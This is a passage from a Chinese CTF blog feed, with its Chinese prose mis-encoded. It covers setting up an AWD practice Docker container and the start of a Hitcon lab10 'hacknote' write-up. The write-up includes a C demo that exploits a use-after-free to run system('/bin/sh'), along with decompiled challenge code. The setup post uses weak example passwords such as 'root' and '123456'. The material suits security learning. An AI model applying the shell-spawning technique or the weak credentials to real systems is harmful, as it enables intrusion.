id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>é…ç½®å¥½äº†Dockerfileï¼Œä»¥åŠbinæ–‡ä»¶å¤¹å’Œhtmlæ–‡ä»¶å¤¹åï¼Œéœ€è¦æ³¨æ„ctf_xinetdé…ç½®æ–‡ä»¶ä¸­çš„binaryç¨‹åºåéœ€è¦ä¸binæ–‡ä»¶å¤¹ä¸­çš„binaryç¨‹åºåä¿æŒä¸€è‡´ï¼Œè¿™ä¸ªå‚ç…§ctf_xinetdè¯´æ˜ä¹¦å³å¯ã€‚</p></blockquote><p>åˆ‡æ¢ç›®å½•åˆ°ä¸dockerfileåŒä¸€ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤:<code>docker build -t imagename .</code></p><p>å®ä¾‹ï¼š<code>docker build -t &quot;awd1test&quot; .</code></p><p>ç­‰å¾…dockerfileæ‰§è¡Œå®Œæ¯•ä¹‹åå°±å¾—åˆ°äº†ä¸€ä¸ªå®šåˆ¶çš„image:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>å¾—åˆ°å®šåˆ¶çš„imageåï¼Œå°±æ˜¯ç”Ÿæˆcontaineräº†ï¼š</p><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; awd1test</code></p><ul><li>18080:80è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„18080ç«¯å£</li><li>13306:3306è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„mysqlæœåŠ¡æ˜ å°„åˆ°ä¸»æœº13306ç«¯å£</li><li>10022:22è¡¨ç¤ºæ˜ å°„sshæœåŠ¡</li><li>19999:9999è¡¨ç¤ºæ˜ å°„pwné¢˜æœåŠ¡</li></ul></blockquote><p>æ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œé€šè¿‡<code>sudo docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„dockerçŠ¶æ€ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><blockquote><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>è¿›å…¥å®¹å™¨ã€‚</p></blockquote><p>è¿›å…¥å®¹å™¨ä¹‹åé¦–å…ˆï¼š</p><ul><li>é€šè¿‡<code>passwd</code>å‘½ä»¤è®¾ç½®rootç”¨æˆ·çš„å¯†ç ä»¥åŠawduserç”¨æˆ·çš„å¯†ç ï¼Œå¹¶ä¸”å¼€å¯sshè¿œç¨‹è¿æ¥æœåŠ¡ï¼Œä»¥ä¾¿è¿ç»´å’Œawdå‚èµ›è€…çš„è¿æ¥ã€‚</li><li>è®¾ç½®å®Œå¯†ç åå¼€å¯sshæœåŠ¡==&gt;<code>service ssh start</code>ã€‚</li><li>åˆå§‹çŠ¶æ€ï¼Œmysqlçš„rootè´¦æˆ·æ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¸ºrootæ·»åŠ å¯†ç <code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>ï¼Œåˆ†å‘ç»™å‚èµ›è€…çš„è´¦æˆ·ä¸ºadminï¼Œå¯†ç éšæœºç”Ÿæˆã€‚</li><li>è‹¥æœ‰mysqlæ•°æ®åº“éœ€è¦åŠ è½½ï¼Œåˆ™ä½¿ç”¨ç±»ä¼¼<code></code>source /var/www/html/web/tcho.sql;`å‘½ä»¤æ¥åŠ è½½sqlè„šæœ¬æ–‡ä»¶ã€‚</li><li>æ·»åŠ å‚èµ›è€…æ•°æ®åº“ç”¨æˆ·ï¼š<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>å…³äºå…·ä½“çš„webé¢˜ç¯å¢ƒå’Œpwné¢˜ç¯å¢ƒï¼Œè¯·è‡ªè¡Œæ›´æ”¹ç›¸å…³æ–‡ä»¶ã€‚</p><h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>è¿è¡Œèµ·æ¥çš„webæœåŠ¡ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" class="lazyload"></p><p>è¿è¡Œåœ¨åŒä¸€dockerå®¹å™¨å†…çš„pwn:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" class="lazyload"></p><blockquote><p>è™½ç„¶éå¸¸ç®€é™‹ï¼Œä½†æ˜¯ç”¨äºç»ƒä¹ è¿˜æ˜¯è¶³å¤Ÿçš„ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD dockerã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="docker" scheme="http://www.yof3ng.xyz/tags/docker/"/>
    
      <category term="AWD" scheme="http://www.yof3ng.xyz/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-11æœˆ02-Hitcon-å…­</title>
    <link href="http://www.yof3ng.xyz/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
    <id>http://www.yof3ng.xyz/2018/11/02/Pwn-11æœˆ02-Hitcon-å…­/</id>
    <published>2018-11-02T06:31:11.000Z</published>
    <updated>2019-04-02T08:46:18.703Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-11æœˆ02-Hitcon-å…­"><a href="#Pwn-11æœˆ02-Hitcon-å…­" class="headerlink" title="Pwn-11æœˆ02-Hitcon-å…­"></a>Pwn-11æœˆ02-Hitcon-å…­</h1><blockquote><p>è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿuafåˆæ˜¯ä»€ä¹ˆï¼Ÿåˆæ˜¯ä¸€é“æ¶¨å§¿åŠ¿çš„é¢˜å‘¢ã€‚å•Šå•Šå•Šä»è¿™å„¿å¼€å§‹å°±æ¥è§¦å †è¿™ç©æ„å„¿äº†ï¼ï¼ï¼</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">å †æº¢å‡ºå­¦ä¹ ä¹‹è·¯</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeï¼Œè·Ÿå­—é¢ä¸Šçš„æ„æ€ä¸€æ ·ï¼šç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨é‡Šæ”¾è¿‡åæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™å†æ¬¡ä½¿ç”¨è¯¥å†…å­˜å—ï¼Œä½¿å¾—ä»¥å‰çš„å†…å­˜æŒ‡é’ˆå¯ä»¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; é‚£é€šè¿‡UAFæ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¹²å˜›ï¼Œå½“ç„¶æ˜¯ç›´æ¥getshellï¼Œé€šè¿‡ä¸‹é¢ä¸€æ®µcç¨‹åºï¼Œè¿›è¡Œç¼–è¯‘å°±èƒ½getshelläº†ï¼ˆç¨‹åºä»£ç æ¥è‡ª<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nçš„åšå®¢</a> ï¼‰ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç¼–è¯‘è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binå‚è€ƒPDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack é€šå¸¸ä¸å †å—è”ç³»åœ¨ä¸€èµ·ï¼Œæ˜¯CTFä¸­å¸¸è§é¢˜å‹ã€‚</p><p>å®šä¹‰å¦‚ä¸‹ï¼š</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attackæ˜¯fastbinåœ¨å­˜å‚¨ç®¡ç†æ—¶ï¼Œä¸ºä¿è¯å¿«é€Ÿåˆ†é…ï¼Œå›æ”¶å†…å­˜çš„éœ€è¦ï¼Œåœ¨å†…å­˜ç®¡ç†çš„æœºåˆ¶ä¸­å‡ºç°çš„é—®é¢˜ï¼Œè¿›è€Œé€ æˆçš„æ¼æ´ï¼Œèƒ½å¤Ÿé€šè¿‡æ¼æ´æ”¹å†™main_arenaä¸Šçš„FasbinYæŒ‡é’ˆæ•°ç»„ï¼Œä»è€Œè·å¾—â€œç‰¹å®šâ€ï¼ˆéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼‰åœ°å€çš„å†™æƒé™ã€‚</p><p>è‡³äºmain_arenaï¼Œå°±å¼•ç”¨ä¸€ä¸‹stackoverflowçš„è§£é‡Šå’¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p><blockquote><p>main_arenaæ˜¯ä¸èƒ½å¯¼å‡ºçš„ä¸€ä¸ªæœ¬åœ°ç¬¦å·è¡¨ã€‚å¯¼å‡ºç¬¦å·åˆ—è¡¨éœ€è¦é€šè¿‡glibcæºä»£ç ç›®å½•ä¸­çš„Versionæ–‡ä»¶æ§åˆ¶ã€‚è¿™æ˜¯è®¾è®¡ç”¨äºé˜²æ­¢äººä»¬é“¾æ¥glibcå†…éƒ¨ä½¿ç”¨çš„éšæœºç¬¦å·ï¼Œï¼ˆæ‰€ä»¥ä¸ä¼šåƒPOSIXå’Œå…¶ä»–æ ‡å‡†é‚£æ ·æ±¡æŸ“å‘½åç©ºé—´ï¼‰ã€‚</p></blockquote><p>gdb can find it because you have debug symbols available â€¦ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdbå¯ä»¥æ‰¾åˆ°main_arenaï¼Œå› ä¸ºä½ å¯ä»¥è·å¾—ä¸€äº›è°ƒè¯•ç¬¦å·è¡¨â€¦å½“ç¨‹åºæ²¡æœ‰è¢«è„±è¡£æœ(not stripped)ï¼Œæˆ–è€…ä½ åœ¨<code>/ usr / lib / debug /</code>ä¸­æ‹†åˆ†è¿‡è°ƒè¯•ç¬¦å·ï¼Œè€Œgdbå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚å½“ä½ å¯åŠ¨gdbè¿›è¡Œè°ƒè¯•æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚<code>loading symbols from / usr / lib / debug / xxxxx</code>è¿™ç§è°ƒè¯•ä¿¡æ¯ã€‚</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>å”¯ä¸€èƒ½å¤Ÿé“¾æ¥åˆ°ç¬¦å·çš„æ–¹æ³•æ˜¯ä»æºé‡æ„GLIBCå¹¶ä¿®æ”¹å¯¼å‡ºåˆ—è¡¨ã€‚</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>æˆ–è€…ï¼Œä½ å¯ä»¥åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­ç¼–å†™ä¸€äº›ä»£ç æ¥åƒgdbè°ƒè¯•ä¸€æ ·ã€‚å³é€šè¿‡åº”ç”¨ç¨‹åºï¼Œæ‰“å¼€è°ƒè¯•æ–‡ä»¶ï¼Œå¤„ç†å…¶ä¸­çš„ELF / DWARFä¿¡æ¯ï¼Œä½¿ç”¨æ´»åŠ¨åŠ è½½çš„åº“ä¿¡æ¯åº”ç”¨é‡å®šä½ï¼ˆè¯·å‚é˜…dl_iterate_phdrï¼‰ï¼Œç„¶åç›´æ¥å¼€å§‹è°ƒç”¨å†…å­˜ã€‚</p></blockquote><p>if thatâ€™s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>å¦‚æœé‚£å¤ªè¿‡äºéº»çƒ¦ï¼Œé»‘å®¢ä¸€ç‚¹çš„è§£å†³æ–¹æ¡ˆå¯èƒ½æ˜¯<code>forkï¼ˆï¼‰+ popenï¼ˆï¼‰</code>gdbè°ƒè¯•ä½ è‡ªå·±çš„è¿›ç¨‹ï¼Œå¹¶ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œå®ƒæ¥è½¬å‚¨ç¬¦å·ä¿¡æ¯ã€‚</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>é‚£ä¹ˆå¼€å§‹åšé¢˜å§ï¼Œå…ˆchecksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ä»¥åŠæ ˆä¸å¯æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬ä»åˆ«çš„åœ°æ–¹å…¥æ‰‹ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>å…ˆç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" class="lazyload"></p><p>è¿™ç§noteç±»é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§äº†ã€‚ã€‚ã€‚å³ä½¿æˆ‘ä¸æ˜¯pwnå¸ˆå‚…ï¼Œæˆ‘ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œå½“ç„¶æ˜¯ä¸€è„¸æ‡µé€¼äº†ï¼ŒğŸ˜­ã€‚</p></blockquote><p>é€šè¿‡IDAé™æ€åˆ†æmainå‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªCä»£ç ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainå‡½æ•°</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//èœå•</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå¯¹è±¡</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ‰“å°å¯¹è±¡</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ·»åŠ note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>çœ‹çœ‹addå‡½æ•°ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆä¸ºnotelistç”³è¯·8å¤§å°çš„ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token 